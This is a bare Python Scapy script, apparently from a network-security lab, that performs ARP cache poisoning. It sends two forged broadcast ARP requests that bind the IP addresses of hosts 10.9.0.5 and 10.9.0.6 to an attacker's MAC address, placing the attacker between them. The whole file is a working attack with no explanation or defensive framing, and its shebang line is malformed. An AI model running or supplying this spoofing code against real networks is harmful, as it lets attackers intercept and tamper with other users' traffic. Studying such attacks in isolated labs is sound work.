#!/usr/bin/envpython3 
from scapy.all import * 

mip = "10.9.0.105"
aip = "10.9.0.5"
bip = "10.9.0.6"
mmac = "02:42:0a:09:00:69"
amac = "02:42:0a:09:00:05" 

E1=Ether() 
A1=ARP() 

A1.op=1 #1forARPrequest;2forARPreply 
A1.pdst = aip
A1.psrc = bip 
A1.hwsrc = mmac
E1.dst = "ff:ff:ff:ff:ff:ff"

pkt1=E1/A1 
sendp(pkt1)

#######

E2=Ether() 
A2=ARP() 

A2.op=1 #1forARPrequest;2forARPreply 
A2.pdst = bip
A2.psrc = aip 
A2.hwsrc = mmac
E2.dst = "ff:ff:ff:ff:ff:ff"

pkt2=E2/A2 
sendp(pkt2)


